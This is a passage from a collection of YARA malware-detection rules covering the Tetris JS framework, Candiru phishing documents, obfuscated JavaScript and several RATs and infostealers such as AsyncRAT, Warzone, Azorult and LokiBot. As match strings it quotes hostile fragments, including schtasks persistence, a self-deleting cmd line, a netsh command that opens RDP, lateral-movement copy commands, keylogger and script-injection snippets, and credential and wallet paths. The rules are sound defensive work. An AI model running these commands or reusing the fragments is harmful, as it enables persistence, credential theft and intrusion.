		$a101 = "SW5maW5pdHk=" // 'imgUrl2Base64'
		$a102 = "ZnJvbQ==" // 'importScripts'
		$a103 = "c29ja2V0" // 'initSocket'
		$a104 = "bWVzc2FnZQ==" // 'inspectSource'
		$a105 = "TWl1aUJyb3dzZXI=" // 'ipec'
		$a106 = "b3NWZXJzaW9u" // 'isConcatSpreadable'
		$a107 = "YXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkO2NoYXJzZXQ9VVRGLTg=" // 'isExtensible'
		$a108 = "dW5kZWZpbmVk" // 'isRender'
		$a109 = "Xi4qTWIyMzQ1QnJvd3NlclwvKFtcZC5dKykuKiQ=" // 'isView'
		$a110 = "UmVnRXhwIGV4ZWMgbWV0aG9kIHJldHVybmVkIHNvbWV0aGluZyBvdGhlciB0aGFuIGFuIE9iamVjdCBvciBudWxs" // 'like Mac OS X'
		$a111 = "aXNJbnRlZ2Vy" // 'link[href="'
		$a112 = "Q3VzdG9tRXZlbnQ=" // 'link[rel=stylesheet]'
		$a113 = "Zm9udHNpemU=" // 'localStorage'
		$a114 = "NC4w" // 'meta[name="referrer"][content="always"]'
		$a115 = "c2lnbmFs" // 'noRefererJsonp'
		$a116 = "aGFzSW5zdGFuY2U=" // 'onFreeze'
		$a117 = "UUhCcm93c2Vy" // 'onabort'
		$a118 = "Y3JlYXRlSGlkZGVuRWxlbWVudA==" // 'onerror'
		$a119 = "aW1hZ2UvcG5n" // 'onload'
		$a120 = "cGx1Z2luVHlwZQ==" // 'onloadend'
		$a121 = "Q2Fubm90IGNhbGwgYSBjbGFzcyBhcyBhIGZ1bmN0aW9u" // 'onmessage'
		$a122 = "dHJhaWxpbmc=" // 'onreadystatechange'
		$a123 = "cHJvamVjdElk" // 'onrejectionhandled'
		$a124 = "cmV0dXJuIChmdW5jdGlvbigpIA==" // 'pluginId'
		$a125 = "b25tZXNzYWdl" // 'pluginType'
		$a126 = "TnVtYmVy" // 'processGET'
		$a127 = "dGV4dGFyZWE=" // 'processLS'
		$a128 = "aXRlcmF0b3I=" // 'processPOST'
		$a129 = "Ni42" // 'projectId'
		$a130 = "TW9iaQ==" // 'pushxhr'
		$a131 = "MzYw" // 'readAsDataURL'
		$a132 = "T3BlcmE=" // 'reduceRight'
		$a133 = "bWFyaw==" // 'regeneratorRuntime = r'
		$a134 = "ZGV2aWNl" // 'return (function() '
		$a135 = "ZmV0Y2g=" // 'return new F('
		$a136 = "Xi4qVmVyc2lvblwvKFtcZC5dKykuKiQ=" // 'rewriteLinks'
		$a137 = "ZG9uZQ==" // 'sSocket'
		$a138 = "TE4y" // 'scriptViaIframe'
		$a139 = "YWxs" // 'scriptViaWindow'
		$a140 = "MjAwMA==" // 'setLS'
		$a141 = "ZmFpbA==" // 'setSL'
		$a142 = "dHJhY2U=" // 'stringify'
		$a143 = "Y29tcGxldGlvbg==" // 'suspendedStart'
		$a144 = "bmV4dA==" // 'toISOString'
		$a145 = "Z19fQnJvd3Nlcg==" // 'userSocketId'
		$a146 = "b25yZWplY3Rpb25oYW5kbGVk" // 'withCredentials'
		$a147 = "VW5kZWZpbmVk" // 'xsrf'
		$a148 = "Q2hyb21lLzY2" // 'zIndex'
		$a149 = "Y2FuY2Vs" // 'zh-mo'
		$a150 = "cmVzdWx0TmFtZQ==" // 'zh-tw'
		$a151 = "YXBwbGljYXRpb24vbW96aWxsYS1ucHFpaG9vcXVpY2tsb2dpbg==" // '{}.constructor("return this")( )'
		$a152 = "YXJn" // ' 2020 Denis Pushkarev (zloirock.ru)'
		$a153 = "U3ltYm9sIGlzIG5vdCBhIGNvbnN0cnVjdG9yIQ==" // 'FileReader'
		$b1 = "#Socket receive,"
		$b2 = "#socket receive,"
		$b3 = "'#task'"
		$b4 = "/public/_images/"
		$b5 = "/public/dependence/jquery/1.12.4/jquery.min.js"
		$b6 = "/public/jquery.min.js?ver="
		$b7 = "/public/socket.io/socket.io.js"
		$b8 = "/sSocket"
		$b9 = "/zSocket"
		$b10 = "<script>document.F=Object</script>"
		$b11 = "AliApp(TB"
		$b12 = "BIDUBrowser"
		$b13 = "Body not allowed for GET or HEAD requests"
		$b14 = "Chromium"
		$b15 = "ClientRectList"
		$b16 = "DOMStringList"
		$b17 = "DataView"
		$b18 = "EPSILON"
		$b19 = "FileReader"
		$b20 = "Firebug"
		$b21 = "Firefox Focus"
		$b22 = "FreeBSD"
		$b23 = "FxiOS"
		$b24 = "HTMLSelectElement"
		$b25 = "HeadlessChrome"
		$b26 = "HuaweiBrowser"
		$b27 = "Iceweasel"
		$b28 = "Int8Array,Uint8Array,Uint8ClampedArray,Int16Array,Uint16Array,Int32Array,Uint32Array,Float32Array,Float64Array"
		$b29 = "IqiyiApp"
		$b30 = "LBBROWSER"
		$b31 = "Mb2345Browser"
		$b32 = "NEW GET JOB, [GET] URL="
		$b33 = "NEW LocalStorage JOB, [LocalStorage] URL="
		$b34 = "NEW POST JOB, [POST] URL="
		$b35 = "Number#toPrecision: incorrect invocation!"
		$b36 = "OnlineTimer"
		$b37 = "PaintRequestList"
		$b38 = "PluginArray"
		$b39 = "Promise-chain cycle"
		$b40 = "QHBrowser"
		$b41 = "QQBrowser"
		$b42 = "QihooBrowser"
		$b43 = "SNEBUY-APP"
		$b44 = "SourceBufferList"
		$b45 = "Symbian"
		$b46 = "URLSearchParams"
		$b47 = "WebKitMutationObserver"
		$b48 = "Wechat"
		$b49 = "Weibo"
		$b50 = "X-Request-URL"
		$b51 = "XiaoMi"
		$b52 = "YaBrowser"
		$b53 = "[object Int16Array]"
		$b54 = "^.*2345Explorer\\/([\\d.]+).*$"
		$b55 = "^.*BIDUBrowser[\\s\\/]([\\d.]+).*$"
		$b56 = "^.*IqiyiVersion\\/([\\d.]+).*$"
		$b57 = "^.*SogouMobileBrowser\\/([\\d.]+).*$"
		$b58 = "^Mozilla\\/\\d.0 \\(Windows NT ([\\d.]+);.*$"
		$b59 = "__FILE__"
		$b60 = "__core-js_shared__"
		$b61 = "__devtools__"
		$b62 = "__p__"
		$b63 = "__pdr__"
		$b64 = "__proto__"
		$b65 = "_initBody"
		$b66 = "addEventListener"
		$b67 = "addIEMeta"
		$b68 = "addNoRefererMeta"
		$b69 = "appendChild"
		$b70 = "application/360softmgrplugin"
		$b71 = "application/hwepass2001.installepass2001"
		$b72 = "application/vnd.chromium.remoting-viewer"
		$b73 = "baiduboxapp"
		$b74 = "browserLanguage"
		$b75 = "callback"
		$b76 = "charCodeAt"
		$b77 = "clearImmediate"
		$b78 = "codePointAt"
		$b79 = "copyWithin"
		$b80 = "credentials"
		$b81 = "crossOrigin"
		$b82 = "crossOriginJsonp"
		$b83 = "devtoolschange"
		$b84 = "executing"
		$b85 = "fakeScreen"
		$b86 = "fastKey"
		$b87 = "finallyLoc"
		$b88 = "g__Browser"
		$b89 = "getAllResponseHeaders"
		$b90 = "getHighestZindex"
		$b91 = "getOwnPropertyDescriptors"
		$b92 = "handleLS"
		$b93 = "handleMessage"
		$b94 = "hasInstance,isConcatSpreadable,iterator,match,replace,search,species,split,toPrimitive,toStringTag,unscopables"
		$b95 = "heartBeats"
		$b96 = "heartBeatsForLS"
		$b97 = "heartbeat"
		$b98 = "hiddenIframe"
		$b99 = "hiddenImg"
		$b100 = "iQiYi"
		$b101 = "imgUrl2Base64"
		$b102 = "importScripts"
		$b103 = "initSocket"
		$b104 = "inspectSource"
		$b105 = "ipec"
		$b106 = "isConcatSpreadable"
		$b107 = "isExtensible"
		$b108 = "isRender"
		$b109 = "isView"
		$b110 = "like Mac OS X"
		$b111 = "link[href=\""
		$b112 = "link[rel=stylesheet]"
		$b113 = "localStorage"
		$b114 = "meta[name=\"referrer\"][content=\"always\"]"
		$b115 = "noRefererJsonp"
		$b116 = "onFreeze"
		$b117 = "onabort"
		$b118 = "onerror"
		$b119 = "onload"
		$b120 = "onloadend"
		$b121 = "onmessage"
		$b122 = "onreadystatechange"
		$b123 = "onrejectionhandled"
		$b124 = "pluginId"
		$b125 = "pluginType"
		$b126 = "processGET"
		$b127 = "processLS"
		$b128 = "processPOST"
		$b129 = "projectId"
		$b130 = "pushxhr"
		$b131 = "readAsDataURL"
		$b132 = "reduceRight"
		$b133 = "regeneratorRuntime = r"
		$b134 = "return (function() "
		$b135 = "return new F("
		$b136 = "rewriteLinks"
		$b138 = "scriptViaIframe"
		$b139 = "scriptViaWindow"
		$b140 = "setLS"
		$b141 = "setSL"
		$b142 = "stringify"
		$b143 = "suspendedStart"
		$b144 = "toISOString"
		$b145 = "userSocketId"
		$b146 = "withCredentials"
		$b147 = "xsrf"
		$b148 = "zIndex"
		$b149 = "zh-mo"
		$b150 = "zh-tw"
		$b151 = "{}.constructor(\"return this\")( )"
		$b152 = "\xc2\xa9 2020 Denis Pushkarev (zloirock.ru)"
		$b153 = "\xE4\xB8\x8D\xE6\x94\xAF\xE6\x8C\x81FileReader"

	condition:
		filesize < 1000000 and (
			25 of ($a*) or
			75 of ($b*)
		)

}

rule apt_CN_Tetrisplugins_JS    
{
	meta:
		author      = "@imp0rtp3"
		description = "Code and strings of plugins from the Tetris framework loaded by Swid"
		reference   = "https://imp0rtp3.wordpress.com/2021/08/12/tetris"

	strings:


		// Really unique strings
		$a1 = "this.plugin = plugin; // \xE8\x87\xAA\xE5\x8A\xA8\xE8\xBF\x90\xE8\xA1\x8C"
		$a2 = "[Success]用户正在使用\\x20Tor\\x20网络"
		$a3 = "(0xbb8);this['socketWatcher'](0xbb9);this["
		$a4 = "a2869674571f77b5a0867c3d71db5856"
		$a5 = "\\x0a\\x20\\x20var\\x20data\\x20=\\x20{}\\x0a\\x20\\x20window.c\\x20=\\x200\\x0a\\x20\\x20script2\\x20=\\x20document.createElement(\\x22script\\x22)\\x0a\\x20\\x20script2.async\\x20=\\x20true\\x0a\\x20\\x20script2.src\\x20=\\x20\\x22"
		$a6 = "{isPluginCallback:\\x20true,\\x20data,\\x20plugin:\\x20'"
		$a7 = "\\x20\\x22*\\x22)\\x0a\\x20\\x20}\\x0a\\x20\\x20document.documentElement.appendChild("
		
		// Still quite unique, but FP possible
		$b1 = "String(str).match(/red\">(.*?)<\\/font>/)"
		$b2 = "['data']);}};}},{'key':'run','value':function _0x"
		$b3 = "},{'plugin':this['plugin'],'save':!![],'type':_typeof("
		$b4 = "Cannot\\x20call\\x20a\\x20class\\x20as\\x20a\\x20function"
		$b5 = "The\\x20command\\x20is\\x20sent\\x20successfully,\\x20wait\\x20for\\x20the\\x20result\\x20to\\x20return"
		$b6 = "getUserMedia\\x20is\\x20not\\x20implemented\\x20in\\x20this\\x20browser"
		$b7 = "{'autoplay':'true'},!![]);setTimeout(function(){return $('#'+"
		$b8 = "keyLogger($('input'));\n        keyLogger($('textarea'));"
		$b9 = "api.loadJS(\"\".concat(api.base.baseUrl"
		$b10 = "\"\".concat(imgUrls[i], \"?t=\""
		$b11 = "key: \"report\",\n      value: function report(data) {\n        return this.api.callback"
		$b12 = "that.api.base.debounce("
		$b13 = "'className','restOfNavigator','push'"
		$b14 = ";};'use strict';function _typeof("
		
		// Rare strings, but not unique
		$c1 = "/public/dependence/jquery"
		$c2 = "'http://bn6kma5cpxill4pe.onion/static/images/tor-logo1x.png'"
		$c3 = "'163.com not login';"
		$c4 = "'ws://localhost:'"
		$c5 = "function _typeof(obj) { \"@babel/helpers - typeof\"; "
		$c6 = "'socketWatcher'"
		$c7 = "['configurable']=!![];"
		$c8 = "')]({'status':!![],'data':_0x"
		$c9 = "')]={'localStorage':'localStorage'in window?window[_0x"
		$c10 = "Browser not supported geolocation.');"
		$c11 = "')]({'status':!![],'msg':'','data':_0x"
		$c12 = "var Plugin = /*#__PURE__*/function () {"
		
		// The TA uses the use strict in all his plugins
		$use_strict1 = "\"use strict\";"
		$use_strict2 = "'use strict';"

		// Some of the same strings in base64, in case the attacker change their obfuscation there
		$e1 = "Cannot\x20call\x20a\x20class\x20as\x20a\x20function" base64
		$e2 = "The\x20command\x20is\x20sent\x20successfully,\x20wait\x20for\x20the\x20result\x20to\x20return" base64
		$e3 = "getUserMedia\x20is\x20not\x20implemented\x20in\x20this\x20browser" base64
		$e4 = "http://bn6kma5cpxill4pe.onion/static/images/tor-logo1x.png" base64
		$e5 = "/public/dependence/jquery" base64
		$e6 = "\x20\x22*\x22)\x0a\x20\x20}\x0a\x20\x20document.documentElement.appendChild(" base64
		$e7 = "[Success]\xE7\x94\xA8\xE6\x88\xB7\xE6\xAD\xA3\xE5\x9C\xA8\xE4\xBD\xBF\xE7\x94\xA8\x5C\x5C\x78\x32\x30\x54\x6F\x72" base64
		$e8 = "\x0a\x20\x20var\x20data\x20=\x20{}\x0a\x20\x20window.c\x20=\x200\x0a\x20\x20script2\x20=\x20document.createElement(\x22script\x22)\x0a\x20\x20script2.async\x20=\x20true\x0a\x20\x20script2.src\x20=\x20\x22"  base64
		$e9 = "{isPluginCallback:\x20true,\x20data,\x20plugin:\x20" base64
		
	condition:
		filesize < 1000000 
		and (
			any of ($a*) 
			or 2 of ($b*)
			or 4 of ($c*)
			or 2 of ($e*)
			or(
				any of ($use_strict*)
				and(
					(
						any of ($b*) 
						and 2 of ($c*)
					)
					or any of ($e*)
				)
			)
		)
}rule SUSP_activex_link
{
	meta:
		author      = "imp0rtp3"
		description = "Suspicious ActiveX link as observed in Candiru phishing documents. The YARA is for the Activex1.xml in the DOC"
		reference   = "https://blog.google/threat-analysis-group/how-we-protect-users-0-day-attacks"
		sha256      = "656d19186795280a068fcb97e7ef821b55ad3d620771d42ed98d22ee3c635e67"
		sha256      = "851bf4ab807fc9b29c9f6468c8c89a82b8f94e40474c6669f105bce91f278fdb"
	strings:
		$a1 = "ax:ocx ax:classid=\"{EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B}\""
		$a2 = "ax:ocxPr ax:name=\"Location\" ax:value=\"http"
		$b1 = "ax:persistence=\"persistPropertyBag\""
		$b2 = "ax:name=\"HideFileNames\""
		$b3 = "ax:name=\"Transparent\""
		$b4 = "ax:name=\"RegisterAsBrowser\""
		$b5 = "ax:name=\"NoClientEdge\""

	condition:
		filesize < 50000 and all of ($a*) and 3 of ($b*)

}
rule SUSP_obfuscated_JS_obfuscatorio
{
	meta:
	
		author      = "@imp0rtp3"
		description = "Detect JS obfuscation done by the js obfuscator (often malicious)"
		reference   = "https://obfuscator.io"

	strings:

		// Beggining of the script
		$a1 = "var a0_0x"
		$a2 = /var _0x[a-f0-9]{4}/
		
		// Strings to search By number of occurences
		$b1 = /a0_0x([a-f0-9]{2}){2,4}\('?0x[0-9a-f]{1,3}'?\)/
		$b2 =/[^\w\d]_0x([a-f0-9]{2}){2,4}\('?0x[0-9a-f]{1,3}'?\)[^\w\d]/
		$b3 = /[^\w\d]_0x([a-f0-9]{2}){2,4}\['push'\]\(_0x([a-f0-9]{2}){2,4}\['shift'\]\(\)[^\w\d]/
		$b4 = /!0x1[^\d\w]/
		$b5 = /[^\w\d]function\((_0x([a-f0-9]{2}){2,4},)+_0x([a-f0-9]{2}){2,4}\)\s?\{/
		$b6 = /[^\w\d]_0x([a-f0-9]{2}){2,4}\s?=\s?_0x([a-f0-9]{2}){2,4}[^\w\d]/
		
		// generic strings often used by the obfuscator
		$c1 = "))),function(){try{var _0x"
		$c2 = "=Function('return\\x20(function()\\x20'+'{}.constructor(\\x22return\\x20this\\x22)(\\x20)'+');');"
		$c3 = "['atob']=function("
		$c4 = ")['replace'](/=+$/,'');var"
		$c5 = "return!![]"
		$c6 = "'{}.constructor(\\x22return\\\x20this\\x22)(\\x20)'"
		$c7 = "{}.constructor(\x22return\x20this\x22)(\x20)" base64
		$c8 = "while(!![])"
		$c9 = "while (!![])"

		// Strong strings
		$d1 = /(parseInt\(_0x([a-f0-9]{2}){2,4}\(0x[a-f0-9]{1,5}\)\)\/0x[a-f0-9]{1,2}\)?(\+|\*\()\-?){6}/
				
	condition:
		$a1 at 0 or
		$a2 at 0 or
		(
			filesize<1000000 and
			(
				(#b1 + #b2) > (filesize \ 200) or
				#b3 > 1 or
				#b4 > 10 or
				#b5 > (filesize \ 2000) or
				#b6 > (filesize \ 200) or
				3 of ($c*) or
				$d1
			)
		)
}
rule agent_tesla_2019 {
    meta:
        author = "jeFF0Falltrades"
        hash = "717f605727d21a930737e9f649d8cf5d12dbd1991531eaf68bb58990d3f57c05"

    strings:
        $appstr_1 = "Postbox" wide ascii nocase
        $appstr_2 = "Thunderbird" wide ascii nocase
        $appstr_3 = "SeaMonkey" wide ascii nocase
        $appstr_4 = "Flock" wide ascii nocase
        $appstr_5 = "BlackHawk" wide ascii nocase
        $appstr_6 = "CyberFox" wide ascii nocase
        $appstr_7 = "KMeleon" wide ascii nocase
        $appstr_8 = "IceCat" wide ascii nocase
        $appstr_9 = "PaleMoon" wide ascii nocase
        $appstr_10 = "IceDragon" wide ascii nocase
        // XOR sequence used in several decoding sequences in final payload
        $xor_seq = { FE 0C 0E 00 20 [4] 5A 20 [4] 61 } 

    condition:
        all of them and #xor_seq > 10
}rule asyncrat {
    meta:
        author = "jeFF0Falltrades"

    strings:
        $val_async = "AsyncClient" wide ascii nocase
        $val_schtasks = "/c schtasks /create /f /sc onlogon /rl highest /tn" wide ascii
        $val_pong = "ActivatePong" wide ascii
        $val_ext = "(ext8,ext16,ex32) type $c7,$c8,$c9" wide ascii
        $aes_exc = "masterKey can not be null or empty" wide ascii
        $aes_salt = { BF EB 1E 56 FB CD 97 3B B2 19 24 30 A5 78 43 3D 56 44 D2 1E 62 B9 D4 F1 80 E7 E6 C3 39 41 }
        $patt_aes = { 6F [4] 80 ?? 00 00 04 7E ?? 00 00 04 73 }
        $patt_settings = { 72 [2] 00 70 80 [2] 00 04 }

    condition:
        5 of them or (2 of ($val*) and 1 of ($aes*)) or (4 of them and #patt_settings >= 15)
}rule ave_maria_warzone_rat {
  meta:
    author = "jeFF0Falltrades"
    ref = "https://blog.team-cymru.com/2019/07/25/unmasking-ave_maria/"

  strings:
    $str_0 = "5.206.225.104/dll/" wide ascii
    $str_1 = "AVE_MARIA" wide ascii 
    $str_2 = "MortyCrypter\\MsgBox.exe" wide ascii 
    $str_3 = "cmd.exe /C ping 1.2.3.4 -n 2 -w 1000 > Nul & Del /f /q" wide ascii 
    $str_4 = "ellocnak.xml" wide ascii 
    $str_5 = "Hey I'm Admin" wide ascii 
    $str_6 = "AWM_FIND" wide ascii 
    $str_7 = "Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}" wide ascii 
    $str_8 = "warzone" wide ascii 

  condition:
  	3 of them
}
import "pe"

rule azorult_plus_plus {
	meta:
		author = "jeFF0Falltrades"
		hash = "9d6611c2779316f1ef4b4a6edcfdfb5e770fe32b31ec2200df268c3bd236ed75"

	strings:
		$rdp = "netsh firewall add portopening TCP 3389 \"Remote Desktop\"" wide ascii nocase
		$list_1 = "PasswordsList.txt" wide ascii nocase
		$list_2 = "CookieList.txt" wide ascii nocase
		$coin_1 = "Ethereum\\keystore" wide ascii nocase
		$c2_1 = ".ac.ug" wide ascii nocase
		$hide_user = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist" wide ascii nocase
		$pdb = "azorult_new.pdb" wide ascii nocase
		$lang_check = { FF 15 44 00 41 00 0F B7 C0 B9 19 04 00 00 66 3B C1 } // call ds:GetUserDefaultLangID; movzx eax, ax; mov ecx, 419h; cmp ax, cx

	condition:
		$pdb or 5 of them or pe.imphash() == "e60de0acc6c7bbe3988e8dc00556d7b9"
}rule bitrat_unpacked
{
    meta:
        author = "jeFF0Falltrades"
        hash = "122cd4f33d1e1b42ce0d959bc35e5d633b029f4869c5510624342b5cc5875c98"
        description = "Experimental rule to detect unpacked BitRat payloads on disk or in memory, looking for a combination of strings and decryption/decoding patterns"
        reference = "https://krabsonsecurity.com/2020/08/22/bitrat-the-latest-in-copy-pasted-malware-by-incompetent-developers/"

    strings:
        $str_0 = "string too long" wide ascii
        $str_1 = "invalid string position" wide ascii
        $hex_0 = { 6b ?? 25 99 f7 ?? 8d [2] 99 f7 }
        $hex_1 = { 0f ba 25 [3] 00 01 0f 82 [4] 0f ba 25 [3] 00 00 }
        $hex_2 = { 66 0f 6f ?? 66 0f 6f [2] 66 0f 6f [2] 66 0f 6f [2] 66 0f 7f ?? 66 0f 7f [2] 66 0f 7f [2]  66 0f 7f  }
        $hex_3= { 8b [2] d3 ?? 33 05 }
        $hex_4 = { 83 [2] 00 c7 05 [8] c7 05 [8] c7 05 [8] 83 }

    condition:
        6 of them
}
rule blackremote_blackrat_payload_2020
{
    meta:
        author = "jeFF0Falltrades"
        ref = "https://unit42.paloaltonetworks.com/blackremote-money-money-money-a-swedish-actor-peddles-an-expensive-new-rat/"

    strings:
        $str_vers_1 = "16.0.0.0" wide ascii
        $str_vers_2 = "16.2.0.0" wide ascii
        $re_c2_1 = /%\*%\|[A-Z0-9]+?\|%\*%\|[A-Z0-9]+?\|%\*%\|[A-Z0-9]+?\|%\*%\|[A-Z0-9]+?/ wide ascii
        $re_c2_2 = /\|!\*!\|\|!\*!\|/ wide ascii
        $hex_rsrc = { 06 12 09 28 ?? 00 00 0A 6F ?? 00 00 0A 06 12 09 28 ?? 00 00 0A 6F ?? 00 00 0A 06 12 09 28 ?? 00 00 0A 6F ?? 00 00 0A }

    condition:
        2 of them and (1 of ($re*) or $hex_rsrc)
}

rule blackremote_blackrat_proclient_2020
{
    meta:
        author = "jeFF0Falltrades"
        ref = "https://unit42.paloaltonetworks.com/blackremote-money-money-money-a-swedish-actor-peddles-an-expensive-new-rat/"

    strings:
	$str_0 = "K:\\5.0\\Black Server 5.0\\BlackServer\\bin\\Release\\BlackRATServerM.pdb" wide ascii nocase
	$str_1 = "BlackRATServerM.pdb" wide ascii nocase
	$str_2 = "RATTypeBinder" wide ascii nocase
	$str_3 = "ProClient.dll" wide ascii nocase
	$str_4 = "Clientx.dll" wide ascii nocase
	$str_5 = "FileMelting" wide ascii nocase
	$str_6 = "Foxmail.url.mailto\\Shell\\open\\command" wide ascii nocase
	$str_7 = "SetRemoteDesktopQuality" wide ascii nocase
	$str_8 = "RecoverChrome" wide ascii nocase
	$str_9 = "RecoverFileZilla" wide ascii nocase
	$str_10 = "RemoteAudioGetInfo" wide ascii nocase

    condition:
        4 of them
}
import "pe"

rule darktrack_rat {
    meta:
        author = "jeFF0Falltrades"
        hash = "1472dd3f96a7127a110918072ace40f7ea7c2d64b95971e447ba3dc0b58f2e6a"
        ref = "https://news.softpedia.com/news/free-darktrack-rat-has-the-potential-of-being-the-best-rat-on-the-market-508179.shtml"

    strings:
        $dt_pdb = "C:\\Users\\gurkanarkas\\Desktop\\Dtback\\AlienEdition\\Server\\SuperObject.pas" wide ascii
        $dt_pas = "SuperObject.pas" wide ascii
        $dt_user = "].encryptedUsername" wide ascii
        $dt_pass = "].encryptedPassword" wide ascii
        $dt_yandex = "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data" wide ascii
        $dt_alien_0 = "4.0 Alien" wide ascii
        $dt_alien_1 = "4.1 Alien" wide ascii
        $dt_victim = "Local Victim" wide ascii

    condition:
        (3 of ($dt*)) or pe.imphash() == "ee46edf42cfbc2785a30bfb17f6da9c2" or pe.imphash() == "2dbff3ce210d5c2b4ba36c7170d04dc2"
}rule dtrack_2020 {
    meta:
        author = "jeFF0Falltrades"

    strings:
        $pdb = "Users\\user\\Documents\\Visual Studio 2008\\Projects\\MyStub\\Release\\MyStub.pdb" wide ascii
        $str_log = "------------------------------ Log File Create...." wide ascii
        $str_ua = "CCS_Mozilla/5.0 (Windows NT 6.1" wide ascii
        $str_chrome = "Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\History" wide ascii
        $str_tmp = "%s\\~%d.tmp" wide ascii
        $str_exc = "Execute_%s.log" wide ascii
        $str_reg_use = /net use \\\\[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\\C\$ \/delete/
        $str_reg_move = /move \/y %s \\\\[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\\C\$\\Windows\\Temp\\MpLogs\\/
        $hex_1 = { d1 ?? 33 ?? fc 81 ?? ff 00 00 00 c1 ?? 17 }
        $hex_2 = { c1 ?? 08 8b ?? fc c1 ?? 10 }
        $hex_3 = { 81 0D [4] 1C 31 39 29 }
    condition:
        2 of them or $hex_3
}
rule EngWUltimate {
        meta:
                author = "jeFF0Falltrades"
                hash = "953b1b99bb5557fe86b3525f28f60d78ab16d56e9c3b4bbe75aba880f18cb6ad"

        strings:
                $b64_1 = "ZG8gbm90IHNjcmlwdA==" wide ascii // do not script
                $b64_2 = "Q2xpcEJvYXJkIExvZw==" wide ascii // ClipBoard Log
                $b64_3 = "RW5nIFdpe" wide ascii // Eng Wiz
                $b64_4 = "SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25c" wide ascii // HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
                $b64_5 = "Q3JNb2RNbmdy" wide ascii // CrModMngr
                $b64_6= "JVBER" wide ascii // Embedded data
                $b64_7 = "qQAAMAAAAEAAAA" wide ascii // Embedded data
                $str_1 = "Eng Wiz" wide ascii nocase
                $str_2 = "Engr Whizzy" wide ascii nocase
                $str_3 = "ClipBoard Log" wide ascii 
                $str_4 = "Keylogger Log" wide ascii 
                $str_pdb = "C:\\Users\\USER\\AppData\\Roaming\\System\\jobs" wide ascii nocase
                // ᚰᚣᛓᚦᚸᚸ᚜ᚨᚻᚼᚱᚻ --> decodes to SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu --> decodes to HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
                $hex_reg = { b0 16 a3 16 d3 16 a6 16 b8 16 b8 16 9c 16 a8 16 bb 16 bc 16 b1 16 bb 16 } 
                // MD5 hashing func
                $hex_md5_func = { 73 46 01 00 0A 0A 28 30 01 00 0A 02 6F 98 00 00 0A 0B 1F ?? 28 7D 00 00 0A } 

        condition:
                uint16(0) == 0x5A4D and ((3 of ($b64*)) or (3 of ($str*)) or (any of ($hex*)))
}// Fires on Formbook VB6 initial and extracted files
rule formbook_vb {
    meta:
        author = "jeFF0Falltrades"
        ref = "https://thisissecurity.stormshield.com/2018/03/29/in-depth-formbook-malware-analysis-obfuscation-and-process-injection/"

    strings:
        $hex_set_info = { 68 65 73 73 00 68 50 72 6F 63 68 74 69 6F 6E 68 6F 72 6D 61 68 74 49 6E 66 68 4E 74 53 65 54 EB 2C }
        $hex_decode_loop = { 81 34 24 [4] 83 E9 03 E0 F1 FF 34 0E 81 34 24 }
        $hex_anti_check = { 80 78 2A 00 74 3D 80 78 2B 00 74 37 80 78 2C 00 75 31 80 78 2D 00 75 2B 80 78 2E 00 74 25 80 78 2F 00 75 1F 80 78 30 00 74 19 80 78 31 00 75 13 80 78 32 00 74 0D 80 78 33 00 }
        $hex_precheck = { E8 AE FA FF FF 3D 00 03 00 00 0F 9F C2 56 88 56 35 E8 3D FC FF FF 56 E8 E7 F6 FF FF 56 E8 41 F9 FF FF 56 E8 AB F7 FF FF 56 E8 F5 DE FF FF }
        $str_marker = "r5.oZe/gg" wide ascii

    condition:
        2 of them
}
rule frat_loader {
  meta:
    author = "jeFF0Falltrades"
    ref = "https://twitter.com/jeFF0Falltrades/status/1270709679375646720"

  strings:
    $str_report_0 = "$ReportDone = Get-BDE" wide ascii 
    $str_report_1 = "$Report = Get-BDE" wide ascii 
    $str_img_0= "$ImgURL = Get-BDE" wide ascii 
    $str_img_1 = "Write-Host 'No Image'" wide ascii 
    $str_img_2 = "$goinf + \"getimageerror\"" wide ascii
    $str_link = "$eLink = Get-BDE" wide ascii  
    $str_tmp_0 = "$Shortcut.WorkingDirectory = $TemplatesFolder" wide ascii 
    $str_tmp_1 = "TemplatesFolder = [Environment]::GetFolderPath" wide ascii
    $str_tmp_2 = "$vbout = $($TemplatesFolder)" wide ascii
    $str_shurtcut = "Get-Shurtcut" wide ascii 
    $str_info_0 = "info=LoadFirstError" wide ascii 
    $str_info_1 = "info=LoadSecondError" wide ascii
    $str_info_2 = "getimagedone?msg" wide ascii
    $str_info_3 = "donemanuel?id" wide ascii
    $str_info_4 = "getDone?msg" wide ascii
    $str_info_5 = "getManualDone?msg" wide ascii

  condition:
    3 of them
}

rule frat_executable {
  meta:
    author = "jeFF0Falltrades"
    ref = "https://twitter.com/jeFF0Falltrades/status/1270709679375646720"

  strings:
    $str_path_0 = "FRat\\\\Short-Port" wide ascii
    $str_path_1 = "FRatv8\\\\Door\\\\Stub" wide ascii 
    $str_path_2 = "snapshot\\\\Stub\\\\V1.js" wide ascii 
    $str_sails = "sails.io" wide ascii 
    $str_crypto = "CRYPTOGAMS by <appro@openssl.org>" wide ascii 
    $str_socketio = "socket.io-client" wide ascii 

  condition:
    3 of them
}
rule infostealer_xor_patterns {
  meta:
    author = "jeFF0Falltrades"
    hash = "d5d1d28270adc1588cf6be33a876587a3c689f6a51ea797eae6b64b5b15805b1"
    description = "The XOR and string patterns shown here appear to be unique to certain information-stealing malware families, namely LokiBot and Pony/Fareit. The XOR patterns were observed in a several loaders and payloads for LokiBot, but have also appeared (less frequently) in Pony/Fareit loaders and samples. The two accompanying rules below can be used to further classify the final payloads."

  strings:
        // call dword ptr ds:[<&GetLastInputInfo>]; sub eax,edi; cmp eax,143
        // User input check in first stage loader (anti-VM)
        $hx_get_input = { ff 15 58 7f 47 00 a1 60 7f 47 00 2b c7 3d 43 01 00 00 }

